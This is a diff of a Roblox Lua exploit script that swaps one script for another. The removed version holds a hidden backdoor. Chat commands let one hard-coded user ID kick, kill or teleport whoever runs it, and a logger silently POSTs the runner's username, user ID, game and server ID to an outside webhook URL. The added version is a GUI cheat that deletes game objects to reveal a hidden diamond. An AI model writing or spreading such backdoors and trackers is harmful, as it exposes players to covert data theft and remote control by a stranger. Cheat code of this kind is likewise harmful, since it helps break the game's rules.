@@ -1,208 +1,118 @@
+-- Gui to Lua
+-- Version: 3.2
 
--- one time executed
-if Executed then
-	return
-end
+-- Instances:
 
-getgenv().Executed = true
-
-local AdminPrefix = "!" -- Change this to what you want (i.e: ;kill <namehere>) (if its blank it will error)
-local Players = game:GetService("Players")
-local LocalP = Players.LocalPlayer;
-local PlayerGui = LocalP:WaitForChild("PlayerGui")
-
-local Vu = Instance.new("ScreenGui")
-local vil = Instance.new("Frame")
-local user = Instance.new("TextLabel")
-local imageuser = Instance.new("ImageLabel")
+local Villaino = Instance.new("ScreenGui")
+local One = Instance.new("Frame")
 local UICorner = Instance.new("UICorner")
-local smeweirdtext = Instance.new("TextLabel")
-
-getgenv().AdminTable = {
-	["692194040"] = {["Access"] = 5}; -- Access is what level of shit you want the person to have access to
-}
-
-getgenv().psearch = function(Name)
-	local Inserted = {}
-	for _, p in pairs(Players:GetPlayers()) do
-		if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
-			table.insert(Inserted, p);return p
-		end
-	end
-end -- Simple player finder function
-
-getgenv().AdminCmdList = {
-	["kick"] = {
-		["CommandFunc"] = function(Player, self, CmdPlayer)
-			if Player == LocalP or Player == "all" then
-				LocalP:Kick(self)
-			end
-		end;
-		["Clearence"] = {[5] = true;};
-	}; -- you can make new ones of these (the ; have to be in the same spots)
-	["kill"] = {
-		["CommandFunc"] = function(Player, self, CmdPlayer)
-			if Player == LocalP or Player == "all" then
-				LocalP.Character.Humanoid:ChangeState(15)
-			end
-		end;
-		["Clearence"] = {[4] = true;[5] = true;};
-	};
-	["bring"] = {
-		["CommandFunc"] = function(Player, self, CmdPlayer)
-			if Player == LocalP or Player == "all" then
-				local root = LocalP.Character:FindFirstChild("HumanoidRootPart") or LocalP.Character:FindFirstChild("Torso")
-				if root then
-					LocalP.Character.HumanoidRootPart.CFrame =  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-				end
-			end
-		end;
-		["Clearence"] = {[4] = true;[5] = true;};
-	};
-};
-
-getgenv().BDCheck = function(Target2, Chat)
-	if Chat:sub(1, 1) == AdminPrefix then
-		local args = string.split(Chat:sub(2), " ")
-		local Command = AdminCmdList[table.remove(args, 1)]
-		local targ1 = psearch(table.remove(args, 1))
-		if Command and targ1 then -- Credits to !fishgang Cy for this BDCheck func
-			return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
-		end
-	end
-end
-
-local GP = Players:GetPlayers()
-for i = 1, #GP do
-	local CoolKidPlayer = GP[i]
-	CoolKidPlayer.Chatted:Connect(function(Word)
-		BDCheck(CoolKidPlayer, Word)
-	end)
-end 
--- Checks if you chatted a command
-Players.PlayerAdded:Connect(function(CKP)
-	CKP.Chatted:Connect(function(Message)
-		BDCheck(CKP, Message)
-	end)
-end)
+local TextBox = Instance.new("TextBox")
+local Two = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
+local TextBox_2 = Instance.new("TextBox")
+local TextLabel = Instance.new("TextLabel")
 
 --Properties:
 
-Vu.Name = "Vu"
-Vu.Parent = PlayerGui
-Vu.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Villaino.Name = "Villaino"
+Villaino.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+Villaino.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
-vil.Name = "vil"
-vil.Parent = Vu
-vil.AnchorPoint = Vector2.new(0.5, 0.5)
-vil.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-vil.BorderColor3 = Color3.fromRGB(27, 42, 53)
-vil.BorderSizePixel = 0
-vil.Position = UDim2.new(0.321526051, 0, 0.49862501, 0)
-vil.Size = UDim2.new(0, 361, 0, 412)
-vil.Draggable = true
-vil.Active = true
+One.Name = "One"
+One.Parent = Villaino
+One.AnchorPoint = Vector2.new(0.5, 0.5)
+One.BackgroundColor3 = Color3.fromRGB(87, 102, 156)
+One.Position = UDim2.new(0.449999988, 0, 0.899999976, 0)
+One.Size = UDim2.new(0.0700000003, 0, 0.0700000003, 0)
+One.SizeConstraint = Enum.SizeConstraint.RelativeYY
 
-user.Name = "user"
-user.Parent = vil
-user.AnchorPoint = Vector2.new(0.5, 0.5)
-user.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-user.BackgroundTransparency = 1.000
-user.Position = UDim2.new(0.5, 0, 0.409658641, 0)
-user.Size = UDim2.new(0, 230, 0, 24)
-user.Font = Enum.Font.Gotham
-user.Text = LocalP.Name
-user.TextColor3 = Color3.fromRGB(255, 255, 255)
-user.TextScaled = true
-user.TextSize = 14.000
-user.TextWrapped = true
+UICorner.Parent = One
 
-imageuser.Name = "imageuser"
-imageuser.Parent = vil
-imageuser.AnchorPoint = Vector2.new(0.5, 0.5)
-imageuser.BackgroundColor3 = Color3.fromRGB(238, 115, 117)
-imageuser.BackgroundTransparency = 1.000
-imageuser.Position = UDim2.new(0.5, 0, 0.224999994, 0)
-imageuser.Size = UDim2.new(0, 100, 0, 100)
+TextBox.Parent = One
+TextBox.AnchorPoint = Vector2.new(0.5, 0.5)
+TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.BackgroundTransparency = 1.000
+TextBox.Position = UDim2.new(0.5, 0, 0.5, 0)
+TextBox.Size = UDim2.new(1, 0, 1, 0)
+TextBox.Font = Enum.Font.GothamBold
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.TextScaled = true
+TextBox.TextSize = 14.000
+TextBox.TextStrokeColor3 = Color3.fromRGB(186, 186, 186)
+TextBox.TextStrokeTransparency = 0.000
+TextBox.TextWrapped = true
 
-UICorner.Parent = imageuser
+Two.Name = "Two"
+Two.Parent = Villaino
+Two.AnchorPoint = Vector2.new(0.5, 0.5)
+Two.BackgroundColor3 = Color3.fromRGB(156, 88, 89)
+Two.Position = UDim2.new(0.5, 0, 0.899999976, 0)
+Two.Size = UDim2.new(0.0700000003, 0, 0.0700000003, 0)
+Two.SizeConstraint = Enum.SizeConstraint.RelativeYY
 
-smeweirdtext.Name = "smeweirdtext"
-smeweirdtext.Parent = vil
-smeweirdtext.AnchorPoint = Vector2.new(0.5, 0.5)
-smeweirdtext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-smeweirdtext.BackgroundTransparency = 1.000
-smeweirdtext.Position = UDim2.new(0.5, 0, 0.5, 0)
-smeweirdtext.Size = UDim2.new(0, 281, 0, 49)
-smeweirdtext.Font = Enum.Font.Gotham
-smeweirdtext.Text = "Esto es un UI de prueba"
-smeweirdtext.TextColor3 = Color3.fromRGB(255, 255, 255)
-smeweirdtext.TextScaled = true
-smeweirdtext.TextSize = 14.000
-smeweirdtext.TextWrapped = true
-smeweirdtext.TextXAlignment = Enum.TextXAlignment.Left
+UICorner_2.Parent = Two
 
+TextBox_2.Parent = Two
+TextBox_2.AnchorPoint = Vector2.new(0.5, 0.5)
+TextBox_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextBox_2.BackgroundTransparency = 1.000
+TextBox_2.Position = UDim2.new(0.5, 0, 0.5, 0)
+TextBox_2.Size = UDim2.new(1, 0, 1, 0)
+TextBox_2.Font = Enum.Font.GothamBold
+TextBox_2.Text = ""
+TextBox_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox_2.TextScaled = true
+TextBox_2.TextSize = 14.000
+TextBox_2.TextStrokeColor3 = Color3.fromRGB(186, 186, 186)
+TextBox_2.TextStrokeTransparency = 0.000
+TextBox_2.TextWrapped = true
 
-					local function HMJCESE_fake_script()
-						local Players = game:GetService("Players")
+TextLabel.Parent = Villaino
+TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.475443155, 0, 0.818425894, 0)
+TextLabel.Size = UDim2.new(0.370072961, 0, 0.049814757, 0)
+TextLabel.Font = Enum.Font.Gotham
+TextLabel.Text = "COLOCA EN LOS 2 CUBOS EL NUMERO DEL VASO DONDE APARECIO EL DIAMANTE"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
 
-						local thumbType = Enum.ThumbnailType.HeadShot
-						local thumbSize = Enum.ThumbnailSize.Size180x180
-						local content, isReady = Players:GetUserThumbnailAsync(LocalP.UserId, thumbType, thumbSize)
-
-
-						local imageLabel = script.Parent
-						imageuser.Image = content
-					end
-					coroutine.wrap(HMJCESE_fake_script)()
-
-        local url =
-        "https://websec.services/send/62e806ed7907ab0a63d4d550"
+for Main , value in pairs(workspace.ArenasREAL:GetChildren()) do
     
-
-        local data = {
-            ["embeds"] = {
-                {
-                    ["title"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-                    ["url"] = "https://www.roblox.com/games/2788229376/Da-Hood",
-                    ["type"] = "rich",
-                    ["fields"] = {
-                        {
-                            ["name"] = '**ROBLOX Name**',
-                            ["value"] = "```" .. game:GetService("Players").LocalPlayer.Name .. "```",
-                            ["inline"] = false,
-
-
-                        },
-                        {
-
-                            ["name"] = '**ROBLOX User ID**',
-                            ["value"] = "```" .. game:GetService("Players").LocalPlayer.UserId .. "```",
-                            ["inline"] = false
-
-                        },
-                        {
-                            ["name"] = '**Game Playing**',
-                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
-                            ["inline"] = false
-
-                        },
-                        {
-                            ["name"] = '**Server ID**',
-                            ["value"] = "```" .. game.JobId .. "```",
-                            ["inline"] = false
-
-                        }
-                    }
-
-                } }
-        }
-
-        local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-        local headers = {
-            ["content-type"] = "application/json"
-        }
-        request = http_request or request or HttpPost or syn.request
-        local abcdef = { Url = url, Body = newdata, Method = "POST", Headers = headers }
-        request(abcdef)
+    if value.Name == "Arena" then
+        
+        for index , mapas in pairs(value:GetDescendants()) do
+            
+            if mapas.Name == "ArenaTemplate" then
+                
+                local A = mapas.Important
+                
+                for parent , hola in pairs(A:GetChildren()) do
+                    
+                    if hola:IsA("Folder") and hola.DataCost == 294 then
+                        
+                        TextBox_2.Changed:Connect(function()
+                            local b = hola[TextBox_2.Text]
+                            b.Detail:Destroy()
+                        end)
+                        
+                        TextBox.Changed:Connect(function()
+                            local c = hola[TextBox.Text]
+                            c.Detail:Destroy()
+                        end)
+                        
+                    end
+                    
+                end
+                
+            end
+            
+        end
+        
+    end
+    
+end
